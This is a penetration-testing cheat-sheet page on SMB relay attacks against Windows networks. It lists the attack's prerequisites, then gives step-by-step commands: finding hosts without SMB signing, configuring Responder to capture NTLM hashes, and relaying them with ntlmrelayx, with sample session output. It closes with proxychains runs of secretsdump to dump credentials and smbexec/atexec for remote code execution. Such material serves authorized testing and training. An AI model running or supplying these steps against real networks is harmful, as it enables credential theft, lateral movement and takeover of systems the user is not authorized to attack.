# SMBRelay

## Brief

Instead of cracking hashes to find the clear password, you can relay those hashes to specific machines and potentially gain access.&#x20;

{% embed url="https://www.netwrix.com/pass_the_hash_attack_explained.html" %}

**Now, this attack requires two things :**

* **SMB signing must be disabled on the target** (_NOTE: by default, SMB Signing is enabled on all DC servers_)
* **Relayed user credentials must be admin** on the machine (we can't relay the hash to the same machine since MS08-068, and the user we're relaying must have admin rights on the target machine if we want code execution otherwise user access if there's an open-share for example)

## Attack

In order to relay hashes, we must **have valid targets**. Valid targets are, as predescribed, machines with SMB Signing disabled. So to get a list of those valide targets we can use for example CrackMapExec :

```bash
cme smb $network_ip/$cidr --gen-relay-list Targets.txt
# or
nmap --script=smb2-security-mode.nse -p445 $network_ip
```

Now off to **capture the hashes**, but we first need to change a little configuration in the responder.conf file (_/usr/share/responder/responder.conf_) :

```bash
[Responder Core]

; Servers to start
SQL = On
SMB = Off     # Turn this off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off    # Turn this off
HTTPS = On
DNS = On
LDAP = On

# then :
python responder.py -I $interface -rdwv

# pop new shell
# ntlmrelayx to relay the intercepted hashes
ntlmrelayx.py -tf Targets.txt -socks -smb2support

# output should be like :
ntlmrelayx> socks
Protocol  Target          Username                  Port
--------  --------------  ------------------------  ----
SMB       192.168.48.38   VULNERABLE/NORMALUSER3    445
MSSQL     192.168.48.230  VULNERABLE/ADMINISTRATOR  1433
MSSQL     192.168.48.230  CONTOSO/NORMALUSER1       1433
SMB       192.168.48.230  VULNERABLE/ADMINISTRATOR  445
SMB       192.168.48.230  CONTOSO/NORMALUSER1       445
SMTP      192.168.48.224  VULNERABLE/NORMALUSER3    25
SMTP      192.168.48.224  CONTOSO/NORMALUSER1       25
IMAP      192.168.48.224  CONTOSO/NORMALUSER1       143
```

### Interact with ntmlrelayx sessions

#### Proxychains

```bash
# edit /etc/proxychains.conf
[ProxyList]
socks4 $your_ip 1080
```

#### Retrieve hashes

```bash
proxychains ./secretsdump.py $domain/$username@$ip
# or get code execution
proxychains smbexec.py $domain/$user@$ip
proxychains atexec.py $domain/$user@$ip "<cmd>"
```
